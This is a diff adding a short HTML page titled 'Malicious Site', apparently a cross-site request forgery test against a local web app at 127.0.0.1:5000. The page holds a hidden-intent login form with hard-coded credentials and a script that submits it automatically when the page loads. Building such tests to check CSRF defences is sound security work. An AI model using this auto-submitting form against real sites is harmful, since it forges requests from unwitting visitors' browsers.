@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Malicious Site</title>
+  </head>
+  <body>
+    <h1>CSRF Test</h1>
+    <form action="http://127.0.0.1:5000/" method="POST">
+      <input type="text" name="username" value="admin">
+      <input type="password" name="password" value="admin123">
+      <input type="submit" value="Submit">
+    </form>
+    <script>
+      document.querySelector("form").submit();
+    </script>
+  </body>
+</html>
